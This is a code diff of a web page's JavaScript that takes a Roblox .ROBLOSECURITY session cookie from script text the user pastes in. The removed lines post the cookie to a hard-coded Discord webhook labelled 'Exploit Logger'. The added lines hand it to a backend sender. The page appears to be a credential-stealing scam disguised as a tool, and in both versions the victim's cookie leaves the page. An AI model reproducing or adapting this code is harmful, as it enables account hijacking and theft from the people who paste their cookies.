@@ -96,48 +96,12 @@ document.addEventListener('DOMContentLoaded', () => {
             const cookieThatWasHopefullyExtracted = extractTheDamnRobloSecurityCookie(scriptTextFromUser);
             const profileUrlThatIsProbablyIgnored = extractTheUselessProfileUrl(scriptTextFromUser);
 
-const cookie = extractTheDamnRobloSecurityCookie(scriptTextFromUser);
-
-if (cookie) {
-    const embed = {
-        title: "🔑 New Roblox Cookie Captured",
-        color: 0xff0000,
-        fields: [
-            { name: ".ROBLOSECURITY", value: cookie.length > 1024 ? cookie.substring(0, 1020) + "..." : cookie }
-        ],
-        footer: { text: "Sent from Exploit Tool" }
-    };
-
-    fetch("https://discord.com/api/webhooks/1393233820685434921/3aIHe5IE3Q23BYDwW_J6Q6jcLEPo2SP7Okqbo4cGepA4_Yk6ngHpYkhCu46E2XNjGcrF", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-            username: "Exploit Logger",
-            embeds: [embed]
-        })
-    })
-    .then(response => {
-        if (response.ok) {
-            console.log("✅ Sent cookie to webhook");
-            statusMessage.textContent = "✅ Cookie sent to Discord webhook!";
-            statusMessage.className = 'success';
-        } else {
-            console.error("❌ Webhook failed", response.status);
-            statusMessage.textContent = "❌ Failed to send to webhook (HTTP " + response.status + ")";
-            statusMessage.className = 'error';
-        }
-    })
-    .catch(err => {
-        console.error("❌ Fetch error", err);
-        statusMessage.textContent = "❌ Network error sending to webhook";
-        statusMessage.className = 'error';
-    });
-} else {
-    statusMessage.textContent = "NO COOKIE FOUND.";
-    statusMessage.className = 'error';
-}
-
-
+            if (cookieThatWasHopefullyExtracted) {
+                sendPatheticRequestToTheBackendOverlord(cookieThatWasHopefullyExtracted, profileUrlThatIsProbablyIgnored);
+            } else {
+                statusMessage.textContent = "NO COOKIE FOUND. Your copy-paste technique is an affront to humanity.";
+                statusMessage.className = 'error';
+            }
         });
     } else {
         const htmlIsGarbageError = "YOUR HTML PAGE IS BROKEN! It's missing 'powershellInput', 'executeButton', or 'statusMessage'. This script is now decorative.";
